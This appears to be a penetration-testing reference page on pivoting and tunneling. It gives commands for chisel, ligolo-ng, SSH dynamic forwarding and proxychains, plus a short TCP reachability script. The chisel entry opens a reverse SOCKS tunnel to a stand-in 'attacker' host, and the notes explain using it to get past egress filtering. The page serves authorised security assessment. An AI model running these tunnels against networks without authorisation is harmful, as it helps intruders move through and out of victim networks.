# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`pivoting-and-tunneling`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `chisel` | `chisel client https://attacker:8080 R:socks` | HTTP-carried SOCKS tunnel, lab only | Cross-platform |
| `ligolo-ng` | `ligolo-ng -selfcert -laddr 0.0.0.0:11601` | Routed tunnel with a TUN interface, lab only | Cross-platform |
| `ssh` | `ssh -D 1080 -N user@foothold` | Dynamic SOCKS forwarding | Cross-platform |
| `proxychains` | `proxychains4 -f proxychains.conf nmap -sT -Pn host` | TCP connect scans through a SOCKS proxy | Linux |
| `ss` | `ss -tunp` | Tunnel sockets on the foothold | Linux |

## Minimal Lab Validation Script

Compare reachability from the assessment host and the foothold, which establishes whether a pivot has any premise.

```python
import socket

TARGETS = [("10.20.40.15", 1433), ("10.20.40.15", 3389)]

def reachable(host, port, timeout=3):
    sock = socket.socket()
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        return True
    except OSError:
        return False
    finally:
        sock.close()

for host, port in TARGETS:
    print(host, port, "reachable_from_assessment_host", reachable(host, port))
```

## Flag Notes

- `-N` keeps an SSH dynamic forward from opening a shell, which limits the foothold's footprint.
- `-sT` is required through a SOCKS proxy, since SYN scans need raw sockets the proxy cannot carry.
- `R:socks` in chisel opens a reverse SOCKS listener, which is the usual direction through egress filtering.
